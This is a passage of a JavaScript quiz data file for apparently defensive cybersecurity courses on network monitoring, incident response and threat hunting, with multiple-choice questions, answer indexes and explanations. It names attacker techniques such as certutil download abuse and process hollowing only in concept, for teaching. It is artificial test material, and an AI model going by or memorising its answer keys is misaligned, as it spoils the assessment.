          "Percentage of network segments with sensor coverage combined with mean time to detect simulated attacks",
          "Number of Suricata rules loaded",
          "Total PCAP storage consumed"
        ],
        correctAnswer: 1,
        explanation: "Effective NSM metrics combine coverage (what percentage of network traffic is monitored) with detection effectiveness (how quickly simulated or red team attacks are identified) — not just raw alert volume."
      },
      {
        id: "nsm-q6-6",
        question: "What is the purpose of traffic baselining in NSM operations?",
        options: [
          "To throttle network bandwidth",
          "To establish normal traffic patterns so that deviations indicating potential threats can be identified",
          "To encrypt all network traffic",
          "To reduce the number of network users"
        ],
        correctAnswer: 1,
        explanation: "Baselining documents normal traffic patterns (volume, protocols, endpoints, time-of-day patterns). Deviations from baseline — such as new protocols, unusual hours, or unexpected destinations — signal potential threats."
      },
      {
        id: "nsm-q6-7",
        question: "During a multi-stage intrusion investigation, what should be your first step after receiving an alert?",
        options: [
          "Immediately block the source IP on the firewall",
          "Pivot from the alert to collect full context: check Zeek logs for the connection UID, review related sessions, and determine scope before taking action",
          "Delete the alert and wait for more",
          "Restart the IDS sensor"
        ],
        correctAnswer: 1,
        explanation: "Effective triage starts with context gathering: trace the alert's connection through Zeek logs, identify related sessions, check for lateral movement, and determine blast radius before containment actions."
      },
      {
        id: "nsm-q6-8",
        question: "What challenge does TLS encryption present for NSM, and how is it addressed?",
        options: [
          "TLS has no impact on monitoring capabilities",
          "TLS prevents payload inspection; analysts compensate using metadata analysis (JA3, SNI, certificate info, connection patterns) and optional TLS inspection proxies",
          "TLS makes all traffic invisible to sensors",
          "TLS is only used on external traffic"
        ],
        correctAnswer: 1,
        explanation: "TLS encrypts payloads but metadata remains visible: JA3 fingerprints, SNI values, certificate details, connection timing/sizes. Combined with optional TLS interception proxies at the perimeter, effective monitoring is maintained."
      },
      {
        id: "nsm-q6-9",
        question: "What is the recommended PCAP retention strategy for a production NSM environment?",
        options: [
          "Keep all PCAPs forever",
          "Tiered retention: full PCAP for days/weeks on fast storage, Zeek metadata for months, alert-related PCAPs archived for years based on compliance requirements",
          "Delete PCAPs immediately after analysis",
          "Only keep PCAPs from weekdays"
        ],
        correctAnswer: 1,
        explanation: "Tiered retention balances storage costs with investigative needs: short-term full PCAP on fast storage, medium-term Zeek metadata, and long-term archival of incident-related captures — aligned with regulatory requirements."
      },
      {
        id: "nsm-q6-10",
        question: "In a final capstone investigation, which approach demonstrates mature NSM analysis?",
        options: [
          "Responding to each alert individually without connecting them",
          "Correlating alerts, Zeek metadata, and PCAP evidence across time to reconstruct the full attack chain from initial access through exfiltration",
          "Focusing only on the most recent alert",
          "Forwarding all alerts to management without analysis"
        ],
        correctAnswer: 1,
        explanation: "Mature NSM analysis correlates all data sources: Suricata alerts identify suspicious events, Zeek logs provide session context and connection history, and PCAP provides packet-level proof — together revealing the complete attack narrative."
      }
    ]
  },
  // ==========================================
  // Incident Response Fundamentals Quizzes
  // ==========================================
  {
    quizId: "ir-q1",
    courseId: "incident-response",
    title: "IR Foundations & Frameworks",
    description: "Test your knowledge of incident response fundamentals, the NIST lifecycle, SANS PICERL, and IR team structure.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "ir-q1-1", question: "What distinguishes a security incident from a security event?", options: ["Incidents are always caused by external attackers", "An incident is a violation or imminent threat of violation of security policies", "Events are more severe than incidents", "Incidents only involve data loss"], correctAnswer: 1, explanation: "A security incident is defined as a violation or imminent threat of violation of security policies." },
      { id: "ir-q1-2", question: "What are the four phases of the NIST SP 800-61 incident response lifecycle?", options: ["Identify, Protect, Detect, Respond", "Preparation, Detection & Analysis, Containment/Eradication/Recovery, Post-Incident Activity", "Prevention, Detection, Response, Recovery", "Assessment, Containment, Remediation, Reporting"], correctAnswer: 1, explanation: "NIST SP 800-61 defines four phases operating as a continuous improvement cycle." },
      { id: "ir-q1-3", question: "How does SANS PICERL differ from NIST regarding containment, eradication, and recovery?", options: ["SANS combines all three into one phase", "SANS separates them into three distinct phases", "SANS skips eradication", "SANS only uses containment and recovery"], correctAnswer: 1, explanation: "SANS PICERL treats Containment, Eradication, and Recovery as three separate phases." },
      { id: "ir-q1-4", question: "What does 'R' stand for in a RACI matrix?", options: ["Reporting", "Responsible", "Reviewing", "Recovering"], correctAnswer: 1, explanation: "R stands for Responsible — the person who does the work." },
      { id: "ir-q1-5", question: "Which IR team model uses a core team augmented by on-call specialists?", options: ["Central IR Team", "Distributed IR Team", "Hybrid / Virtual Team", "Outsourced / Retainer"], correctAnswer: 2, explanation: "A Hybrid/Virtual Team maintains a core IR team augmented by on-call specialists from different departments." },
      { id: "ir-q1-6", question: "What is the average dwell time reported by industry studies?", options: ["24 hours", "7 days", "30 days", "200+ days"], correctAnswer: 3, explanation: "Industry reports show average dwell times exceeding 200 days." },
      { id: "ir-q1-7", question: "Which framework is NOT an IR framework but essential for understanding adversary TTPs?", options: ["NIST SP 800-61", "SANS PICERL", "ISO 27035", "MITRE ATT&CK"], correctAnswer: 3, explanation: "MITRE ATT&CK is a knowledge base of adversary TTPs, not an IR framework." },
      { id: "ir-q1-8", question: "What is the primary purpose of the NIST Post-Incident Activity phase?", options: ["Prosecuting the attacker", "Feeding lessons back into Preparation for continuous improvement", "Restoring systems", "Notifying regulators"], correctAnswer: 1, explanation: "Post-Incident Activity closes the loop by feeding improvements back into Preparation." },
      { id: "ir-q1-9", question: "Organizations without formal IR capability face approximately how much higher breach costs?", options: ["25%", "40%", "63%", "90%"], correctAnswer: 2, explanation: "Approximately 63% higher breach costs according to the IBM Cost of a Data Breach Report." },
      { id: "ir-q1-10", question: "Which stakeholder handles breach notification and regulatory compliance?", options: ["HR", "IT Operations", "Legal / General Counsel", "Communications / PR"], correctAnswer: 2, explanation: "Legal/General Counsel handles breach notification, regulatory compliance, and privilege considerations." }
    ]
  },
  {
    quizId: "ir-q2",
    courseId: "incident-response",
    title: "Preparation & Readiness",
    description: "Test your knowledge of IR planning, communication, toolkit preparation, and tabletop exercises.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "ir-q2-1", question: "What is the correct hierarchy of IR documentation?", options: ["Playbook → Plan → Policy", "Policy → Plan → Playbook", "Plan → Policy → Playbook", "Policy → Playbook → Plan"], correctAnswer: 1, explanation: "Policy (high-level) → Plan (detailed procedures) → Playbook (step-by-step guides)." },
      { id: "ir-q2-2", question: "Why should IR teams use out-of-band communication during an incident?", options: ["To save money", "Because compromised systems may be monitored by the attacker", "To avoid documentation", "Because normal channels are too slow"], correctAnswer: 1, explanation: "Compromised systems may be monitored, so out-of-band channels prevent the attacker from observing IR coordination." },
      { id: "ir-q2-3", question: "Under GDPR, what is the breach notification timeline?", options: ["24 hours", "48 hours", "72 hours", "7 days"], correctAnswer: 2, explanation: "GDPR Article 33 requires notification within 72 hours of becoming aware of a personal data breach." },
      { id: "ir-q2-4", question: "What is the primary purpose of a write blocker?", options: ["Encrypt evidence", "Prevent modification of evidence drives during imaging", "Speed up imaging", "Compress forensic images"], correctAnswer: 1, explanation: "Write blockers prevent any write operations to evidence drives, maintaining integrity and admissibility." },
      { id: "ir-q2-5", question: "In a tabletop exercise, what is an 'inject'?", options: ["A type of malware", "A timed scenario element introducing new information or escalation", "A technical attack tool", "A report document"], correctAnswer: 1, explanation: "Injects are timed scenario elements that introduce new information and force participants to adapt." },
      { id: "ir-q2-6", question: "Which tool is designed for rapid triage artifact collection?", options: ["Wireshark", "KAPE", "Nmap", "Burp Suite"], correctAnswer: 1, explanation: "KAPE is specifically designed for rapid triage collection of forensic artifacts from endpoints." },
      { id: "ir-q2-7", question: "How often should an IR jump bag be validated?", options: ["After incidents only", "Annually", "Monthly with quarterly exercises", "When new tools release"], correctAnswer: 2, explanation: "Monthly validation ensures tools are updated; quarterly exercises test deployment readiness." },
      { id: "ir-q2-8", question: "A SEV-1 incident includes which of the following?", options: ["Policy violations", "Malware on isolated system", "Active data exfiltration or ransomware spreading", "Suspicious unconfirmed activity"], correctAnswer: 2, explanation: "SEV-1 covers active exfiltration, spreading ransomware, and complete service outages." },
      { id: "ir-q2-9", question: "What is the most common finding from tabletop exercises?", options: ["Inadequate tools", "Unclear or outdated escalation paths", "Lack of certifications", "Insufficient budgets"], correctAnswer: 1, explanation: "Common findings include unclear escalation paths, outdated contacts, and disagreements about authority." },
      { id: "ir-q2-10", question: "Why establish attorney-client privilege for IR communications?", options: ["To avoid documenting incidents", "To protect IR communications from legal discovery", "To bypass regulatory requirements", "To limit access to the IR plan"], correctAnswer: 1, explanation: "Privilege protects sensitive investigation details from being discoverable in litigation." }
    ]
  },
  {
    quizId: "ir-q3",
    courseId: "incident-response",
    title: "Detection & Analysis",
    description: "Test your understanding of detection sources, triage, indicator analysis, and root cause analysis.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "ir-q3-1", question: "In the Pyramid of Pain, which indicator is HARDEST for attackers to change?", options: ["Hash values", "IP addresses", "Domain names", "TTPs"], correctAnswer: 3, explanation: "TTPs are fundamental to how attackers operate; changing them requires completely retooling." },
      { id: "ir-q3-2", question: "What is the difference between an IOC and an IOA?", options: ["IOCs are behavioral; IOAs are artifacts", "IOCs are artifacts; IOAs are behavioral patterns during an attack", "IOAs are more specific", "No difference"], correctAnswer: 1, explanation: "IOCs are forensic artifacts left behind; IOAs are behavioral patterns detected during an attack." },
      { id: "ir-q3-3", question: "What response time SLA is expected for SEV-1 initial response?", options: ["1 hour", "30 minutes", "15 minutes", "4 hours"], correctAnswer: 2, explanation: "SEV-1 requires 15-minute initial response with updates every 30 minutes." },
      { id: "ir-q3-4", question: "The 5 Whys technique aims to identify:", options: ["The responsible individual", "The systemic failure that allowed the attack", "Five attack vectors", "Five mitigations"], correctAnswer: 1, explanation: "The 5 Whys drills from symptoms to the underlying systemic/organizational failure." },
      { id: "ir-q3-5", question: "Which source often FIRST detects BEC attacks?", options: ["SIEM rules", "EDR", "User reports", "NDR tools"], correctAnswer: 2, explanation: "Users who receive suspicious emails often provide the first detection for BEC and social engineering." },
      { id: "ir-q3-6", question: "What is 'anchoring bias' in incident triage?", options: ["Prioritizing specific data sources", "Assuming the first hypothesis is correct", "Only investigating during business hours", "Focusing only on high-severity alerts"], correctAnswer: 1, explanation: "Anchoring bias means interpreting all subsequent evidence to confirm the initial hypothesis." },
      { id: "ir-q3-7", question: "In a fishbone diagram, 'missing EDR coverage' falls under which category?", options: ["People", "Process", "Technology", "Policy"], correctAnswer: 2, explanation: "Missing EDR coverage is a Technology contributing factor." },
      { id: "ir-q3-8", question: "What is the target MTTD for a high-performing IR team?", options: ["< 1 hour", "< 24 hours", "< 7 days", "< 30 days"], correctAnswer: 1, explanation: "High-performing teams target MTTD under 24 hours vs. the industry average of ~200 days." },
      { id: "ir-q3-9", question: "Which correlation technique groups events by time window?", options: ["Entity correlation", "TTP mapping", "Temporal correlation", "Behavioral correlation"], correctAnswer: 2, explanation: "Temporal correlation groups events by time window to build chronological attack timelines." },
      { id: "ir-q3-10", question: "Impact assessment during triage evaluates which triad?", options: ["People, Process, Technology", "Confidentiality, Integrity, Availability", "Detection, Response, Recovery", "Risk, Threat, Vulnerability"], correctAnswer: 1, explanation: "Impact is assessed across the CIA triad: was data accessed (C), modified (I), or services disrupted (A)?" }
    ]
  },
  {
    quizId: "ir-q4",
    courseId: "incident-response",
    title: "Containment Strategies",
    description: "Test your knowledge of containment, evidence preservation, and decision-making frameworks.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "ir-q4-1", question: "Why should you NEVER power off a compromised system before capturing memory?", options: ["It damages the hard drive", "You lose volatile evidence: RAM, processes, network connections", "The OS won't boot again", "It triggers attacker dead man switches"], correctAnswer: 1, explanation: "Powering off destroys volatile evidence including RAM, running processes, and network connections." },
      { id: "ir-q4-2", question: "How many times must KRBTGT be reset to remediate Golden Ticket attacks?", options: ["Once", "Twice with 12+ hour gap", "Three times over 48 hours", "Depends on domain controllers"], correctAnswer: 1, explanation: "KRBTGT must be reset twice with 12+ hours between to invalidate tickets from both old and new hashes." },
      { id: "ir-q4-3", question: "What is a DNS sinkhole used for during containment?", options: ["Speed up DNS for IR team", "Redirect malicious domains to reveal other infected systems", "Block all DNS traffic", "Encrypt DNS queries"], correctAnswer: 1, explanation: "DNS sinkholes redirect malicious domain resolutions, blocking C2 and revealing other infected systems." },
      { id: "ir-q4-4", question: "In the order of volatility, which should be collected FIRST?", options: ["Disk contents", "Log files", "Running memory (RAM)", "Backup media"], correctAnswer: 2, explanation: "RAM is the most practically collectible volatile evidence and is lost on power-off." },
      { id: "ir-q4-5", question: "When is monitoring preferred over immediate isolation?", options: ["When ransomware is spreading", "When the attacker is dormant and you need intelligence", "When data is being exfiltrated", "When legal requires immediate action"], correctAnswer: 1, explanation: "Monitoring is preferred when the attacker is dormant, allowing intelligence gathering about scope and TTPs." },
      { id: "ir-q4-6", question: "Chain of custody documentation includes:", options: ["Only the hash value", "Collector, time, tool, storage location, and every transfer", "Only analyst name and date", "Only description and case number"], correctAnswer: 1, explanation: "Full chain of custody tracks collector, time, tool, hash, storage, and every subsequent transfer." },
      { id: "ir-q4-7", question: "Why is coordinated simultaneous containment important?", options: ["It's faster", "It prevents attackers from adapting to individual containment actions", "It reduces tools needed", "It simplifies documentation"], correctAnswer: 1, explanation: "Sequential containment lets sophisticated attackers detect and adapt; simultaneous containment prevents this." },
      { id: "ir-q4-8", question: "Which containment method maintains management connectivity while isolating endpoints?", options: ["Disabling NICs", "VLAN isolation", "EDR isolation", "Firewall blocking"], correctAnswer: 2, explanation: "EDR isolation blocks all network traffic except the EDR management connection." },
      { id: "ir-q4-9", question: "Which hash algorithms should verify forensic images?", options: ["MD5 only", "SHA-1 only", "MD5 + SHA-256", "CRC32"], correctAnswer: 2, explanation: "Using both MD5 and SHA-256 provides stronger verification expected in legal contexts." },
      { id: "ir-q4-10", question: "What should always happen before issuing a litigation hold?", options: ["Complete the investigation", "Notify law enforcement", "Consult legal counsel on preservation requirements", "Power off affected systems"], correctAnswer: 2, explanation: "Legal counsel determines preservation requirements before issuing holds to prevent routine data destruction." }
    ]
  },
  {
    quizId: "ir-q5",
    courseId: "incident-response",
    title: "Eradication & Recovery",
    description: "Test your knowledge of malware removal, system restoration, validation, and business resumption.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "ir-q5-1", question: "When should you REBUILD rather than clean a system?", options: ["Only when outdated", "When rootkits are detected, DCs are compromised, or scope is unclear", "Only when malware is found", "Only for compliance"], correctAnswer: 1, explanation: "Rebuilding is required for rootkits, compromised DCs, or unclear scope — re-compromise risk is too high." },
      { id: "ir-q5-2", question: "Which persistence mechanism achieves fileless execution via WMI?", options: ["Registry Run Keys", "Scheduled Tasks", "WMI Event Subscriptions", "DLL Hijacking"], correctAnswer: 2, explanation: "WMI Event Subscriptions create fileless persistence that traditional AV may not detect." },
      { id: "ir-q5-3", question: "What is the correct phased restoration order?", options: ["Workstations → Critical → Core", "Core infrastructure → Critical business → Workstations → Non-critical", "All simultaneously", "Non-critical first"], correctAnswer: 1, explanation: "Start with core infrastructure (AD, DNS), then critical business systems, then workstations, then non-critical." },
      { id: "ir-q5-4", question: "What must happen BEFORE reconnecting a restored system?", options: ["Notify users", "Patch vulnerabilities, install EDR, configure enhanced logging", "Complete the final report", "Hold lessons learned meeting"], correctAnswer: 1, explanation: "All patches, EDR, enhanced logging, credential rotation, and scanning must be done before reconnection." },
      { id: "ir-q5-5", question: "How long should enhanced monitoring continue post-incident?", options: ["1 week", "2 weeks", "30-90 days", "6 months"], correctAnswer: 2, explanation: "30-90 days of enhanced monitoring allows detection of missed persistence or attacker re-entry." },
      { id: "ir-q5-6", question: "What distinguishes business resumption from technical recovery?", options: ["No difference", "Recovery focuses on systems; resumption focuses on business processes and user productivity", "Resumption happens first", "Recovery is owned by business units"], correctAnswer: 1, explanation: "Systems running doesn't mean users are productive — resumption ensures business processes function." },
      { id: "ir-q5-7", question: "Which re-compromise sign requires IMMEDIATE escalation?", options: ["Normal logins", "Connections to previously blocked attacker infrastructure from new sources", "More help desk tickets", "Slow performance"], correctAnswer: 1, explanation: "New sources connecting to blocked attacker infrastructure indicates missed persistence or new compromise." },
      { id: "ir-q5-8", question: "When restoring from backup, what must NOT be skipped?", options: ["Restore the most recent backup", "Verify backup predates compromise and scan for malware", "Restore to original hardware", "Notify users first"], correctAnswer: 1, explanation: "Backups created after compromise may contain attacker persistence mechanisms." },
      { id: "ir-q5-9", question: "What marks formal transition from IR to normal operations?", options: ["Systems restored", "Report published", "Executive sign-off", "Enhanced monitoring ends"], correctAnswer: 2, explanation: "Executive sign-off ensures leadership has reviewed the response and accepted residual risk." },
      { id: "ir-q5-10", question: "A common business resumption challenge is:", options: ["Systems running too fast", "Application dependencies blocking processes even when individual systems work", "Too many IT staff", "Users adapting too quickly"], correctAnswer: 1, explanation: "Complex interdependencies between applications can prevent business processes from functioning." }
    ]
  },
  {
    quizId: "ir-q6",
    courseId: "incident-response",
    title: "Post-Incident Activities",
    description: "Test your knowledge of lessons learned, report writing, metrics, and continuous improvement.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "ir-q6-1", question: "What is the fundamental principle of a blameless post-mortem?", options: ["No one is responsible", "Focus on systemic improvements, not individual blame", "Only managers attend", "No documentation"], correctAnswer: 1, explanation: "Blameless post-mortems create psychological safety by focusing on systems, not individuals." },
      { id: "ir-q6-2", question: "When should lessons learned meetings be held?", options: ["24 hours", "Within 2 weeks", "1 month", "3 months"], correctAnswer: 1, explanation: "Within 2 weeks while details are fresh in participants' minds." },
      { id: "ir-q6-3", question: "Every action item should include:", options: ["Only a description", "A single owner, specific deadline, and success criteria", "Budget and ROI", "CEO approval"], correctAnswer: 1, explanation: "Single owner, specific deadline, and clear success criteria ensure accountability." },
      { id: "ir-q6-4", question: "Which metric measures total attacker presence time?", options: ["MTTD", "MTTR", "Dwell Time", "MTTE"], correctAnswer: 2, explanation: "Dwell time = total time from compromise to eradication. Target: < 7 days; average: ~200 days." },
      { id: "ir-q6-5", question: "The Executive Summary of an incident report should contain:", options: ["Full IOC lists", "Plain-language summary, business impact, key decisions, top recommendations", "Only MITRE mapping", "Complete forensic methodology"], correctAnswer: 1, explanation: "Executive summaries are 1 page, written in plain language for leadership." },
      { id: "ir-q6-6", question: "What does 're-compromise rate' measure?", options: ["New incident frequency", "How often eradication fails and the attacker returns", "Patch frequency", "False positive rate"], correctAnswer: 1, explanation: "High re-compromise rate indicates insufficient eradication thoroughness." },
      { id: "ir-q6-7", question: "If MTTD is trending up, invest in:", options: ["More handlers", "Eradication tools", "Detection capabilities (SIEM, EDR, threat intel)", "Faster backups"], correctAnswer: 2, explanation: "Increasing MTTD means slower detection — invest in detection capabilities." },
      { id: "ir-q6-8", question: "What timestamp format should incident reports use?", options: ["Analyst's local time", "UTC", "EST/EDT", "Affected system timezone"], correctAnswer: 1, explanation: "UTC prevents confusion when correlating events across systems and locations." },
      { id: "ir-q6-9", question: "At which maturity level does IR become metrics-driven?", options: ["Developing (2)", "Defined (3)", "Managed (4)", "Optimizing (5)"], correctAnswer: 2, explanation: "Level 4 (Managed) features metrics-driven continuous improvement and integrated threat intel." },
      { id: "ir-q6-10", question: "'Deploy EDR on uncovered systems' is which improvement category?", options: ["Detection", "Process", "Technology", "People"], correctAnswer: 2, explanation: "Deploying tools and expanding coverage falls under Technology improvements." }
    ]
  },
  {
    quizId: "th-q1",
    courseId: "threat-hunting",
    title: "Hunting Methodology & Frameworks",
    description: "Test your understanding of threat hunting methodology, the Hunting Maturity Model, and hypothesis-driven hunting.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "th-q1-1", question: "What is the primary difference between threat hunting and traditional detection?", options: ["Hunting uses automated alerts only", "Hunting is proactive and hypothesis-driven", "Hunting replaces SIEM entirely", "Hunting focuses on compliance"], correctAnswer: 1, explanation: "Threat hunting is proactive — analysts form hypotheses and actively search for threats rather than waiting for alerts." },
      { id: "th-q1-2", question: "How many levels does the Hunting Maturity Model (HMM) define?", options: ["3", "4", "5", "6"], correctAnswer: 2, explanation: "The HMM defines 5 levels: HM0 (Initial), HM1 (Minimal), HM2 (Procedural), HM3 (Innovative), and HM4 (Leading)." },
      { id: "th-q1-3", question: "At which HMM level does an organization begin routine data collection but lacks structured hunting?", options: ["HM0", "HM1", "HM2", "HM3"], correctAnswer: 1, explanation: "HM1 (Minimal) means the org collects data routinely but hunting is ad-hoc and relies on indicators." },
      { id: "th-q1-4", question: "What is the first step of hypothesis-driven hunting?", options: ["Collect evidence", "Formulate a testable hypothesis", "Write a report", "Deploy a new tool"], correctAnswer: 1, explanation: "Hypothesis-driven hunting begins with a testable hypothesis based on threat intelligence, experience, or anomaly patterns." },
      { id: "th-q1-5", question: "Which of the following is a characteristic of a good hunting hypothesis?", options: ["It is vague and broad", "It is testable and falsifiable", "It requires no data", "It is based on gut feeling alone"], correctAnswer: 1, explanation: "A good hypothesis is specific, testable, falsifiable, and grounded in threat intelligence or data patterns." },
      { id: "th-q1-6", question: "What does 'TTP' stand for in the context of threat hunting?", options: ["Total Threat Prevention", "Tactics, Techniques, and Procedures", "Threat Tracking Protocol", "Triage, Test, and Publish"], correctAnswer: 1, explanation: "TTP stands for Tactics, Techniques, and Procedures — the behavioral patterns of adversaries mapped in frameworks like MITRE ATT&CK." },
      { id: "th-q1-7", question: "Which hunting approach starts with known threat intelligence indicators?", options: ["Baseline hunting", "Intel-driven hunting", "Anomaly-based hunting", "Compliance hunting"], correctAnswer: 1, explanation: "Intel-driven hunting uses known IOCs, TTPs, or threat reports as starting points for investigation." },
      { id: "th-q1-8", question: "What is 'baseline hunting'?", options: ["Hunting for the newest malware", "Establishing normal behavior and looking for deviations", "Using only signature-based detection", "Hunting during business hours only"], correctAnswer: 1, explanation: "Baseline hunting establishes what 'normal' looks like in an environment and then searches for anomalous deviations." },
      { id: "th-q1-9", question: "At HM4 (Leading), what distinguishes the organization?", options: ["No automation", "Hunting is fully automated with no analysts", "Continuous hunting with custom tooling and automation feeding back into detection", "They outsource all hunting"], correctAnswer: 2, explanation: "HM4 organizations run continuous hunts with custom tooling and systematically convert findings into automated detections." },
      { id: "th-q1-10", question: "Why should hunt findings be documented even when no threat is found?", options: ["To blame analysts", "To justify headcount", "To refine baselines, improve hypotheses, and demonstrate coverage", "Documentation is optional"], correctAnswer: 2, explanation: "Documenting all hunts — including negatives — refines baselines, improves future hypotheses, and demonstrates security coverage." }
    ]
  },
  {
    quizId: "th-q2",
    courseId: "threat-hunting",
    title: "Threat Intelligence for Hunters",
    description: "Assess your knowledge of the Pyramid of Pain, IOC types, and intelligence-driven hunting.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "th-q2-1", question: "In David Bianco's Pyramid of Pain, which indicator is at the top (hardest for adversaries to change)?", options: ["Hash values", "IP addresses", "TTPs", "Domain names"], correctAnswer: 2, explanation: "TTPs sit at the top — changing behavior and tradecraft is far more costly for adversaries than rotating IPs or hashes." },
      { id: "th-q2-2", question: "Which indicator type is at the bottom of the Pyramid of Pain (easiest for attackers to change)?", options: ["TTPs", "Tools", "Hash values", "Network artifacts"], correctAnswer: 2, explanation: "Hash values are trivial to change — a single-bit modification produces a completely different hash." },
      { id: "th-q2-3", question: "What is a 'Diamond Model' used for in threat intelligence?", options: ["Pricing threat feeds", "Mapping relationships between adversary, capability, infrastructure, and victim", "Grading analyst performance", "Designing network architecture"], correctAnswer: 1, explanation: "The Diamond Model maps intrusion events across four vertices: adversary, capability, infrastructure, and victim." },
      { id: "th-q2-4", question: "What type of IOC is 'c:\\users\\public\\malware.exe'?", options: ["Network indicator", "Host-based indicator (file path)", "Behavioral indicator", "Email indicator"], correctAnswer: 1, explanation: "File paths are host-based indicators — they point to specific artifacts on an endpoint." },
      { id: "th-q2-5", question: "Why are IP-based IOCs considered low-value for long-term hunting?", options: ["They are too expensive", "Adversaries rotate IPs frequently and cheaply", "SIEM cannot ingest them", "They cause false negatives"], correctAnswer: 1, explanation: "IP addresses are cheap and easy for attackers to change, making them unreliable for sustained hunting." },
      { id: "th-q2-6", question: "What is 'threat intelligence enrichment'?", options: ["Deleting old IOCs", "Adding context (reputation, geo, relationships) to raw indicators", "Encrypting threat feeds", "Sharing IOCs publicly"], correctAnswer: 1, explanation: "Enrichment adds context like reputation scores, geolocation, WHOIS data, and relationships to raw indicators." },
      { id: "th-q2-7", question: "Which level of threat intelligence is most useful for SOC analysts and hunters?", options: ["Strategic", "Tactical/Operational", "Political", "Financial"], correctAnswer: 1, explanation: "Tactical and operational intelligence provides actionable IOCs, TTPs, and campaign details for day-to-day hunting." },
      { id: "th-q2-8", question: "What is a YARA rule used for?", options: ["Network monitoring", "Pattern-based malware identification using string/byte patterns", "User authentication", "Log rotation"], correctAnswer: 1, explanation: "YARA rules identify malware by matching string patterns, byte sequences, and conditions within files." },
      { id: "th-q2-9", question: "In the Pyramid of Pain, where do 'Tools' fall?", options: ["Bottom", "Middle-lower", "Middle-upper", "Top"], correctAnswer: 2, explanation: "Tools sit in the middle-upper region — replacing custom tooling is costly but not as hard as changing TTPs." },
      { id: "th-q2-10", question: "What is 'indicator fatigue'?", options: ["Running out of storage", "Analysts overwhelmed by excessive low-quality IOCs reducing effectiveness", "Hardware failure", "Network congestion"], correctAnswer: 1, explanation: "Indicator fatigue occurs when analysts are overwhelmed by massive volumes of low-quality IOCs, reducing detection effectiveness." }
    ]
  },
  {
    quizId: "th-q3",
    courseId: "threat-hunting",
    title: "Techniques & Tradecraft",
    description: "Quiz on adversary techniques including LOLBins, JA3 fingerprinting, and evasion methods.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "th-q3-1", question: "What are LOLBins?", options: ["A type of malware", "Legitimate OS binaries abused by attackers to execute malicious actions", "Logging libraries", "Linux-only tools"], correctAnswer: 1, explanation: "LOLBins (Living Off the Land Binaries) are legitimate system tools like PowerShell, certutil, and mshta abused by attackers." },
      { id: "th-q3-2", question: "Which Windows binary is commonly abused to download files from the internet?", options: ["notepad.exe", "certutil.exe", "calc.exe", "explorer.exe"], correctAnswer: 1, explanation: "certutil.exe has a -urlcache flag that attackers abuse to download payloads from remote servers." },
      { id: "th-q3-3", question: "What does JA3 fingerprinting identify?", options: ["User identity", "TLS client configuration to fingerprint applications", "File hashes", "Email headers"], correctAnswer: 1, explanation: "JA3 creates a hash of TLS client hello parameters, uniquely fingerprinting applications regardless of IP or domain." },
      { id: "th-q3-4", question: "What is 'process hollowing'?", options: ["Deleting processes", "Replacing the code inside a legitimate process with malicious code", "Creating new user accounts", "Clearing event logs"], correctAnswer: 1, explanation: "Process hollowing creates a legitimate process in suspended state, replaces its memory with malicious code, then resumes it." },
      { id: "th-q3-5", question: "Which MITRE ATT&CK tactic involves maintaining access after initial compromise?", options: ["Initial Access", "Persistence", "Exfiltration", "Reconnaissance"], correctAnswer: 1, explanation: "Persistence ensures the attacker maintains access across reboots, credential changes, or other disruptions." },
      { id: "th-q3-6", question: "What is 'DLL side-loading'?", options: ["Installing DLLs normally", "Placing a malicious DLL where a legitimate program will load it", "Updating system DLLs", "Compiling DLLs"], correctAnswer: 1, explanation: "DLL side-loading exploits the DLL search order by placing a malicious DLL in a location searched before the legitimate one." },
      { id: "th-q3-7", question: "What is the JA3S hash used for?", options: ["Client fingerprinting", "Server TLS configuration fingerprinting", "DNS resolution", "File integrity"], correctAnswer: 1, explanation: "JA3S fingerprints the server-side TLS hello response, complementing JA3 for full client-server profiling." },
      { id: "th-q3-8", question: "Which technique involves running malicious code entirely in memory without touching disk?", options: ["Fileless malware / in-memory execution", "Disk encryption", "File compression", "Normal installation"], correctAnswer: 0, explanation: "Fileless attacks execute entirely in memory, evading traditional file-based antivirus and leaving minimal forensic artifacts." },
      { id: "th-q3-9", question: "What Windows event log is most valuable for detecting LOLBin abuse?", options: ["Application log", "System log", "Sysmon (with process creation logging)", "Setup log"], correctAnswer: 2, explanation: "Sysmon provides detailed process creation, command-line, and parent-child relationship logging essential for LOLBin detection." },
      { id: "th-q3-10", question: "What is 'timestomping'?", options: ["Changing system time zone", "Modifying file timestamps to blend in with legitimate files", "Setting up NTP", "Creating time-based alerts"], correctAnswer: 1, explanation: "Timestomping changes file creation/modification times to make malicious files appear as if they've existed longer, evading timeline analysis." }
    ]
  },
  {
    quizId: "th-q4",
    courseId: "threat-hunting",
    title: "Endpoint Hunting",
    description: "Test your skills in hunting for threats on endpoints using process trees, autoruns, and memory analysis.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "th-q4-1", question: "What is the most important artifact to examine when hunting on endpoints?", options: ["Desktop wallpaper", "Process execution and parent-child relationships", "Screen resolution", "Installed fonts"], correctAnswer: 1, explanation: "Process trees reveal anomalous parent-child relationships, like Word spawning PowerShell, which indicate malicious activity." },
      { id: "th-q4-2", question: "Which parent process spawning cmd.exe is suspicious?", options: ["explorer.exe", "services.exe", "winword.exe", "cmd.exe"], correctAnswer: 2, explanation: "Microsoft Word (winword.exe) spawning cmd.exe is highly suspicious — it suggests macro-based malware execution." },
      { id: "th-q4-3", question: "What are 'autoruns' in the context of endpoint hunting?", options: ["Automatic software updates", "Persistence mechanisms that execute code at startup or login", "Automated scan schedules", "Auto-reply email rules"], correctAnswer: 1, explanation: "Autoruns are registry keys, startup folders, scheduled tasks, and services that execute automatically — common persistence locations." },
      { id: "th-q4-4", question: "Which tool is commonly used to enumerate Windows autorun locations?", options: ["Wireshark", "Sysinternals Autoruns", "Nmap", "Burp Suite"], correctAnswer: 1, explanation: "Sysinternals Autoruns comprehensively lists all auto-starting locations in Windows for persistence analysis." },
